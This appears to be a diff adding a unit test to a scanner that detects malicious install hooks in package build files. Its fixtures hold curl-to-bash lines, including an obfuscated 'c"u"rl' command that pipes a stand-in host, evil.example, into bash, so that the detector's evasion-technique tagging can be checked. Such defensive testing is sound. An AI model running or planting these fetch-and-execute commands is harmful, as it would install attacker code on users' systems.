@@ -572,3 +572,12 @@ def test_x034_reads_the_committed_install_hook():
     diff = ("--- /dev/null\n+++ b/ay.install\n@@ -0,0 +1,2 @@\n"
             f"+  bash <(curl -L '{ARCHIVE}' 2>/dev/null)\n")
     assert "X034" in set(crossfire_techniques(diff))
+
+
+def test_an_x_finding_carries_its_additive_technique_tag():
+    """The harness shape archive reads these; they never enter the score."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
+            "+  c\"u\"rl -fsSL https://evil.example | bash\n }\n")
+    fact = scan_diff(diff, package_name="demo")
+    x002 = [e for e in fact.score_breakdown if e.rule_id == "X002"]
+    assert x002 and x002[0].techniques == ("X002:partial-quote",)
